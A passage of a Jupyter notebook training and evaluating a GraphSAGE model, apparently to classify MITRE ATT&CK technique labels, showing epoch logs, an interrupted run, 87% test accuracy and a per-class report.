      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:14:50 | INFO | Validation Loss: 1.0332 | Validation Accuracy: 0.8116\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "b445fc5a3691447c969318b3a327f75c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:15:05 | INFO | Epoch 150 | Train Loss: 0.4587 | Train Accuracy: 0.9073\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "325fb4f60001404ea711e719b6894c70",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:15:07 | INFO | Validation Loss: 0.9537 | Validation Accuracy: 0.8140\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "eb4a5add1ac848c792fe981c054b5766",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:15:21 | INFO | Epoch 151 | Train Loss: 0.4925 | Train Accuracy: 0.8984\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ed3f231a7dae42128f46e8312d5eb1ac",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:15:23 | INFO | Validation Loss: 0.8771 | Validation Accuracy: 0.8204\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "0b53bc34911c4b5f90de0f8ce4cea68f",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:15:37 | INFO | Epoch 152 | Train Loss: 0.4466 | Train Accuracy: 0.9094\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "40e79361fc9943a89ca1fd7e18a1a557",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:15:38 | INFO | Validation Loss: 1.0263 | Validation Accuracy: 0.7899\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "128a491b54c24fb6a13ba113abb5ca0a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:15:52 | INFO | Epoch 153 | Train Loss: 0.4711 | Train Accuracy: 0.9037\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "274968313fa84c95aa015e9354a1089d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:15:53 | INFO | Validation Loss: 0.9573 | Validation Accuracy: 0.8166\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "524dd28aabd24530bbf4af1d19aa80d6",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:16:05 | INFO | Epoch 154 | Train Loss: 0.4632 | Train Accuracy: 0.9073\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "786e7fab8708426689dc197b575a6c0a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:16:07 | INFO | Validation Loss: 1.2813 | Validation Accuracy: 0.7929\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "57f5731663f541398c88b4912e2b3e42",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:16:19 | INFO | Epoch 155 | Train Loss: 0.4767 | Train Accuracy: 0.9002\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ea7d5f01383b428581383f200df761a7",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:16:20 | INFO | Validation Loss: 0.9794 | Validation Accuracy: 0.8107\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9ad93aba8c574c79b0592eddc96af892",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:16:32 | INFO | Epoch 156 | Train Loss: 0.4567 | Train Accuracy: 0.9067\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "dc2cc53720a44d6e9acedd12f4545c2b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:16:33 | INFO | Validation Loss: 1.1722 | Validation Accuracy: 0.7834\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8f087e84514e4fdf8e382a76907e6986",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:16:48 | INFO | Epoch 157 | Train Loss: 0.4462 | Train Accuracy: 0.9093\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "59d5bd27bec947789de52e1593e2fffe",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:16:50 | INFO | Validation Loss: 1.0228 | Validation Accuracy: 0.8050\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "bcbc79b0551941ba840c95774883123b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "ename": "KeyboardInterrupt",
     "evalue": "",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mKeyboardInterrupt\u001b[0m                         Traceback (most recent call last)",
      "Cell \u001b[0;32mIn[39], line 23\u001b[0m\n\u001b[1;32m     21\u001b[0m total_loss \u001b[38;5;241m=\u001b[39m \u001b[38;5;241m0.0\u001b[39m\n\u001b[1;32m     22\u001b[0m total_accuracy \u001b[38;5;241m=\u001b[39m \u001b[38;5;241m0.0\u001b[39m    \n\u001b[0;32m---> 23\u001b[0m \u001b[38;5;28;01mfor\u001b[39;00m data \u001b[38;5;129;01min\u001b[39;00m tqdm(train_dataloader):\n\u001b[1;32m     24\u001b[0m     loss, accuracy, _ \u001b[38;5;241m=\u001b[39m model_fn(data, model, criterion, device, which_type\u001b[38;5;241m=\u001b[39m\u001b[38;5;124m'\u001b[39m\u001b[38;5;124mtrain\u001b[39m\u001b[38;5;124m'\u001b[39m)        \n\u001b[1;32m     25\u001b[0m     optimizer\u001b[38;5;241m.\u001b[39mzero_grad()\n",
      "File \u001b[0;32m~/anaconda3/envs/DGL/lib/python3.10/site-packages/tqdm/notebook.py:249\u001b[0m, in \u001b[0;36mtqdm_notebook.__iter__\u001b[0;34m(self)\u001b[0m\n\u001b[1;32m    247\u001b[0m \u001b[38;5;28;01mtry\u001b[39;00m:\n\u001b[1;32m    248\u001b[0m     it \u001b[38;5;241m=\u001b[39m \u001b[38;5;28msuper\u001b[39m(tqdm_notebook, \u001b[38;5;28mself\u001b[39m)\u001b[38;5;241m.\u001b[39m\u001b[38;5;21m__iter__\u001b[39m()\n\u001b[0;32m--> 249\u001b[0m     \u001b[38;5;28;01mfor\u001b[39;00m obj \u001b[38;5;129;01min\u001b[39;00m it:\n\u001b[1;32m    250\u001b[0m         \u001b[38;5;66;03m# return super(tqdm...) will not catch exception\u001b[39;00m\n\u001b[1;32m    251\u001b[0m         \u001b[38;5;28;01myield\u001b[39;00m obj\n\u001b[1;32m    252\u001b[0m \u001b[38;5;66;03m# NB: except ... [ as ...] breaks IPython async KeyboardInterrupt\u001b[39;00m\n",
      "File \u001b[0;32m~/anaconda3/envs/DGL/lib/python3.10/site-packages/tqdm/std.py:1182\u001b[0m, in \u001b[0;36mtqdm.__iter__\u001b[0;34m(self)\u001b[0m\n\u001b[1;32m   1179\u001b[0m time \u001b[38;5;241m=\u001b[39m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39m_time\n\u001b[1;32m   1181\u001b[0m \u001b[38;5;28;01mtry\u001b[39;00m:\n\u001b[0;32m-> 1182\u001b[0m     \u001b[38;5;28;01mfor\u001b[39;00m obj \u001b[38;5;129;01min\u001b[39;00m iterable:\n\u001b[1;32m   1183\u001b[0m         \u001b[38;5;28;01myield\u001b[39;00m obj\n\u001b[1;32m   1184\u001b[0m         \u001b[38;5;66;03m# Update and possibly print the progressbar.\u001b[39;00m\n\u001b[1;32m   1185\u001b[0m         \u001b[38;5;66;03m# Note: does not call self.update(1) for speed optimisation.\u001b[39;00m\n",
      "File \u001b[0;32m~/anaconda3/envs/DGL/lib/python3.10/site-packages/torch/utils/data/dataloader.py:628\u001b[0m, in \u001b[0;36m_BaseDataLoaderIter.__next__\u001b[0;34m(self)\u001b[0m\n\u001b[1;32m    625\u001b[0m \u001b[38;5;28;01mif\u001b[39;00m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39m_sampler_iter \u001b[38;5;129;01mis\u001b[39;00m \u001b[38;5;28;01mNone\u001b[39;00m:\n\u001b[1;32m    626\u001b[0m     \u001b[38;5;66;03m# TODO(https://github.com/pytorch/pytorch/issues/76750)\u001b[39;00m\n\u001b[1;32m    627\u001b[0m     \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39m_reset()  \u001b[38;5;66;03m# type: ignore[call-arg]\u001b[39;00m\n\u001b[0;32m--> 628\u001b[0m data \u001b[38;5;241m=\u001b[39m \u001b[38;5;28;43mself\u001b[39;49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43m_next_data\u001b[49m\u001b[43m(\u001b[49m\u001b[43m)\u001b[49m\n\u001b[1;32m    629\u001b[0m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39m_num_yielded \u001b[38;5;241m+\u001b[39m\u001b[38;5;241m=\u001b[39m \u001b[38;5;241m1\u001b[39m\n\u001b[1;32m    630\u001b[0m \u001b[38;5;28;01mif\u001b[39;00m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39m_dataset_kind \u001b[38;5;241m==\u001b[39m _DatasetKind\u001b[38;5;241m.\u001b[39mIterable \u001b[38;5;129;01mand\u001b[39;00m \\\n\u001b[1;32m    631\u001b[0m         \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39m_IterableDataset_len_called \u001b[38;5;129;01mis\u001b[39;00m \u001b[38;5;129;01mnot\u001b[39;00m \u001b[38;5;28;01mNone\u001b[39;00m \u001b[38;5;129;01mand\u001b[39;00m \\\n\u001b[1;32m    632\u001b[0m         \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39m_num_yielded \u001b[38;5;241m>\u001b[39m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39m_IterableDataset_len_called:\n",
      "File \u001b[0;32m~/anaconda3/envs/DGL/lib/python3.10/site-packages/torch/utils/data/dataloader.py:671\u001b[0m, in \u001b[0;36m_SingleProcessDataLoaderIter._next_data\u001b[0;34m(self)\u001b[0m\n\u001b[1;32m    669\u001b[0m \u001b[38;5;28;01mdef\u001b[39;00m \u001b[38;5;21m_next_data\u001b[39m(\u001b[38;5;28mself\u001b[39m):\n\u001b[1;32m    670\u001b[0m     index \u001b[38;5;241m=\u001b[39m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39m_next_index()  \u001b[38;5;66;03m# may raise StopIteration\u001b[39;00m\n\u001b[0;32m--> 671\u001b[0m     data \u001b[38;5;241m=\u001b[39m \u001b[38;5;28;43mself\u001b[39;49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43m_dataset_fetcher\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mfetch\u001b[49m\u001b[43m(\u001b[49m\u001b[43mindex\u001b[49m\u001b[43m)\u001b[49m  \u001b[38;5;66;03m# may raise StopIteration\u001b[39;00m\n\u001b[1;32m    672\u001b[0m     \u001b[38;5;28;01mif\u001b[39;00m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39m_pin_memory:\n\u001b[1;32m    673\u001b[0m         data \u001b[38;5;241m=\u001b[39m _utils\u001b[38;5;241m.\u001b[39mpin_memory\u001b[38;5;241m.\u001b[39mpin_memory(data, \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39m_pin_memory_device)\n",
      "File \u001b[0;32m~/anaconda3/envs/DGL/lib/python3.10/site-packages/torch/utils/data/_utils/fetch.py:61\u001b[0m, in \u001b[0;36m_MapDatasetFetcher.fetch\u001b[0;34m(self, possibly_batched_index)\u001b[0m\n\u001b[1;32m     59\u001b[0m \u001b[38;5;28;01melse\u001b[39;00m:\n\u001b[1;32m     60\u001b[0m     data \u001b[38;5;241m=\u001b[39m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39mdataset[possibly_batched_index]\n\u001b[0;32m---> 61\u001b[0m \u001b[38;5;28;01mreturn\u001b[39;00m \u001b[38;5;28;43mself\u001b[39;49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mcollate_fn\u001b[49m\u001b[43m(\u001b[49m\u001b[43mdata\u001b[49m\u001b[43m)\u001b[49m\n",
      "Cell \u001b[0;32mIn[24], line 22\u001b[0m, in \u001b[0;36mcollate\u001b[0;34m(samples)\u001b[0m\n\u001b[1;32m     20\u001b[0m     g\u001b[38;5;241m.\u001b[39medata[\u001b[38;5;124m'\u001b[39m\u001b[38;5;124mfeat\u001b[39m\u001b[38;5;124m'\u001b[39m] \u001b[38;5;241m=\u001b[39m torch\u001b[38;5;241m.\u001b[39mstack(data[\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124medge_attr\u001b[39m\u001b[38;5;124m\"\u001b[39m])\n\u001b[1;32m     21\u001b[0m     \u001b[38;5;66;03m# print(data[\"labels\"])\u001b[39;00m\n\u001b[0;32m---> 22\u001b[0m     g\u001b[38;5;241m.\u001b[39medata[\u001b[38;5;124m'\u001b[39m\u001b[38;5;124mlabel\u001b[39m\u001b[38;5;124m'\u001b[39m] \u001b[38;5;241m=\u001b[39m \u001b[43mtorch\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mtensor\u001b[49m\u001b[43m(\u001b[49m\u001b[43mdata\u001b[49m\u001b[43m[\u001b[49m\u001b[38;5;124;43m\"\u001b[39;49m\u001b[38;5;124;43mlabels\u001b[39;49m\u001b[38;5;124;43m\"\u001b[39;49m\u001b[43m]\u001b[49m\u001b[43m)\u001b[49m  \n\u001b[1;32m     24\u001b[0m     batched_graphs\u001b[38;5;241m.\u001b[39mappend(g)\n\u001b[1;32m     26\u001b[0m \u001b[38;5;28;01mreturn\u001b[39;00m dgl\u001b[38;5;241m.\u001b[39mbatch(batched_graphs)\n",
      "\u001b[0;31mKeyboardInterrupt\u001b[0m: "
     ]
    }
   ],
   "source": [
    "same_seeds(42)\n",
    "model = Model(in_features=50, hidden_features=64, out_features=128, num_classes=len(label2index), edge_embedding_dim = 50)\n",
    "model = model.to(device)\n",
    "optimizer = AdamW(model.parameters(), lr=5e-4)\n",
    "scheduler = lr_scheduler.CosineAnnealingLR(optimizer, T_max=20, eta_min=0, last_epoch=- 1, verbose=False)\n",
    "criterion = nn.CrossEntropyLoss()\n",
    "model_save_path = \"./model/GraphSAGE_transE_50\"\n",
    "best_model_path = ''\n",
    "\n",
    "best_val_loss = float('inf')\n",
    "\n",
    "if not os.path.isdir(model_save_path):\n",
    "    os.makedirs(model_save_path)\n",
    "\n",
    "epochs = 200\n",
    "best_val_loss = float('inf')\n",
    "best_val_acc = float('-inf')\n",
    "best_model_path = \"\"\n",
    "for epoch in tqdm(range(epochs)):\n",
    "    model.train()\n",
    "    total_loss = 0.0\n",
    "    total_accuracy = 0.0    \n",
    "    for data in tqdm(train_dataloader):\n",
    "        loss, accuracy, _ = model_fn(data, model, criterion, device, which_type='train')        \n",
    "        optimizer.zero_grad()\n",
    "        loss.backward()\n",
    "        optimizer.step()\n",
    "\n",
    "        total_loss += loss.item()\n",
    "        total_accuracy += accuracy.item()\n",
    "\n",
    "    scheduler.step()\n",
    "    \n",
    "    avg_loss = total_loss / len(train_dataloader)\n",
    "    avg_accuracy = total_accuracy / len(train_dataloader)\n",
    "    logging.info(f'Epoch {epoch} | Train Loss: {avg_loss:.4f} | Train Accuracy: {avg_accuracy:.4f}')\n",
    "    \n",
    "    # Validation Part\n",
    "    model.eval()\n",
    "    total_accuracy = 0.0\n",
    "    total_loss = 0.0\n",
    "    with torch.no_grad():\n",
    "        for data in tqdm(valid_dataloader):\n",
    "            loss, accuracy, _ = model_fn(data, model, criterion, device, which_type='validation')\n",
    "            total_accuracy += accuracy.item()\n",
    "            total_loss += loss.item()\n",
    "\n",
    "    avg_accuracy = total_accuracy / len(valid_dataloader)\n",
    "    current_loss = total_loss / len(valid_dataloader)\n",
    "    # if current_loss < best_val_loss and avg_accuracy > best_val_acc:\n",
    "    if current_loss < best_val_loss:\n",
    "        best_val_loss = current_loss\n",
    "        best_val_acc = avg_accuracy\n",
    "        best_model_path = f'{model_save_path}/epoch_{epoch}_loss_{current_loss:.4f}_acc_{avg_accuracy:.4f}'\n",
    "        print(\"Best Model Found!! \", best_model_path)\n",
    "        \n",
    "    logging.info(f'Validation Loss: {current_loss:.4f} | Validation Accuracy: {avg_accuracy:.4f}\\n')    \n",
    "    torch.save(model.state_dict(), f'{model_save_path}/epoch_{epoch}_loss_{current_loss:.4f}_acc_{avg_accuracy:.4f}')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "id": "30c34e7d-d1bd-4cf2-9aee-1e0d480d5ee6",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'./model/GraphSAGE_transE_50/epoch_60_loss_0.5975_acc_0.8483'"
      ]
     },
     "execution_count": 40,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "best_model_path"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "id": "2d315dd6",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:17:01 | INFO | Test Accuracy: 87.2167 %\n",
      "\n",
      "\n",
      "\n"
     ]
    }
   ],
   "source": [
    "# load the pretrained model\n",
    "model.load_state_dict(torch.load(best_model_path))\n",
    "\n",
    "model.to(device)\n",
    "model.eval()\n",
    "\n",
    "total = 0\n",
    "correct = 0\n",
    "true_labels = []\n",
    "predicted_labels = []\n",
    "with torch.no_grad():\n",
    "    for data in test_dataloader:\n",
    "        loss, accuracy, predicted = model_fn(data, model, criterion, device, which_type='test')\n",
    "        labels = data.edata['label'].to(device)\n",
    "        \n",
    "        true_labels.extend(labels.cpu().numpy())\n",
    "        predicted_labels.extend(predicted.cpu().numpy())\n",
    "                \n",
    "        total += labels.size(0)\n",
    "        correct += (predicted == labels).sum().item()\n",
    "\n",
    "logging.info(f'Test Accuracy: {100 * correct / total:.4f} %\\n\\n\\n')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "id": "77a3a939",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/media/Raid6_disk/bai/anaconda3/envs/DGL/lib/python3.10/site-packages/sklearn/metrics/_classification.py:1497: UndefinedMetricWarning: Precision is ill-defined and being set to 0.0 in labels with no predicted samples. Use `zero_division` parameter to control this behavior.\n",
      "  _warn_prf(average, modifier, f\"{metric.capitalize()} is\", len(result))\n",
      "/media/Raid6_disk/bai/anaconda3/envs/DGL/lib/python3.10/site-packages/sklearn/metrics/_classification.py:1497: UndefinedMetricWarning: Precision is ill-defined and being set to 0.0 in labels with no predicted samples. Use `zero_division` parameter to control this behavior.\n",
      "  _warn_prf(average, modifier, f\"{metric.capitalize()} is\", len(result))\n",
      "/media/Raid6_disk/bai/anaconda3/envs/DGL/lib/python3.10/site-packages/sklearn/metrics/_classification.py:1497: UndefinedMetricWarning: Precision is ill-defined and being set to 0.0 in labels with no predicted samples. Use `zero_division` parameter to control this behavior.\n",
      "  _warn_prf(average, modifier, f\"{metric.capitalize()} is\", len(result))\n"
     ]
    }
   ],
   "source": [
    "report_data = classification_report(true_labels, predicted_labels, output_dict=True)\n",
    "report_df = pd.DataFrame(report_data).transpose()\n",
    "\n",
    "output_path = \"./result/GraphSAGE_emb256\"\n",
    "if not os.path.isdir(output_path):\n",
    "    os.makedirs(output_path)\n",
    "    \n",
    "report_df.reset_index(inplace=True, names='label')\n",
    "\n",
    "label_list = []\n",
    "for idx, row in report_df.iterrows():\n",
    "    if row[\"label\"].isdigit():\n",
    "        row[\"label\"] = index2label[int(row[\"label\"])]\n",
    "    label_list.append(row[\"label\"])\n",
    "report_df[\"label\"] = label_list\n",
    "\n",
    "report_df.to_csv(f'{output_path}/result.csv', index=False)\n",
    "print(\"report output at: \", f'{output_path}/result.csv')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "id": "e6175621-9e8f-4770-aba2-27650b8d7c9e",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "report output at:  ./result/GraphSAGE_emb256/result.csv\n"
     ]
    }
   ],
   "source": [
    "print(\"report output at: \", f'{output_path}/result.csv')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "id": "d8f4e766",
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>label</th>\n",
       "      <th>precision</th>\n",
       "      <th>recall</th>\n",
       "      <th>f1-score</th>\n",
       "      <th>support</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>T1112_34041639e6e501856ecaf5969ee29c76_I</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>42.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>T1547.001_1f15ab22c39a9b6bb2bb0d77276dfcb3_I</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>90.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>T1499_2fe2d5e6-7b06-4fc0-bf71-6966a1226731_B</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>20.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>T1036.003_04e8d83e7badf098d50800d6aa1dd487_B</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>22.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>T1562.002_6a8d25d65a7d481dc479f89c62af1e6a_I</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>40.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>272</th>\n",
       "      <td>T1119_7121cdf93b951311be9d7078c602efdc_B</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>23.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>273</th>\n",
       "      <td>T1115_70795de7cbb842edb029b3378c27c008_B</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>22.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>274</th>\n",
       "      <td>accuracy</td>\n",
       "      <td>0.872167</td>\n",
       "      <td>0.872167</td>\n",
       "      <td>0.872167</td>\n",
       "      <td>0.872167</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>275</th>\n",
       "      <td>macro avg</td>\n",
       "      <td>0.030788</td>\n",
       "      <td>0.021034</td>\n",
       "      <td>0.021526</td>\n",
       "      <td>814055.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>276</th>\n",
       "      <td>weighted avg</td>\n",
       "      <td>0.860489</td>\n",
       "      <td>0.872167</td>\n",
       "      <td>0.862541</td>\n",
       "      <td>814055.000000</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>277 rows × 5 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                                            label  precision    recall  \\\n",
       "0        T1112_34041639e6e501856ecaf5969ee29c76_I   0.000000  0.000000   \n",
       "1    T1547.001_1f15ab22c39a9b6bb2bb0d77276dfcb3_I   0.000000  0.000000   \n",
       "2    T1499_2fe2d5e6-7b06-4fc0-bf71-6966a1226731_B   0.000000  0.000000   \n",
       "3    T1036.003_04e8d83e7badf098d50800d6aa1dd487_B   0.000000  0.000000   \n",
       "4    T1562.002_6a8d25d65a7d481dc479f89c62af1e6a_I   0.000000  0.000000   \n",
       "..                                            ...        ...       ...   \n",
       "272      T1119_7121cdf93b951311be9d7078c602efdc_B   0.000000  0.000000   \n",
       "273      T1115_70795de7cbb842edb029b3378c27c008_B   0.000000  0.000000   \n",
       "274                                      accuracy   0.872167  0.872167   \n",
       "275                                     macro avg   0.030788  0.021034   \n",
       "276                                  weighted avg   0.860489  0.872167   \n",
       "\n",
       "     f1-score        support  \n",
       "0    0.000000      42.000000  \n",
       "1    0.000000      90.000000  \n",
       "2    0.000000      20.000000  \n",
       "3    0.000000      22.000000  \n",
       "4    0.000000      40.000000  \n",
       "..        ...            ...  \n",
       "272  0.000000      23.000000  \n",
       "273  0.000000      22.000000  \n",
       "274  0.872167       0.872167  \n",
       "275  0.021526  814055.000000  \n",
       "276  0.862541  814055.000000  \n",
       "\n",
       "[277 rows x 5 columns]"
      ]
     },
     "execution_count": 43,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "report_df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
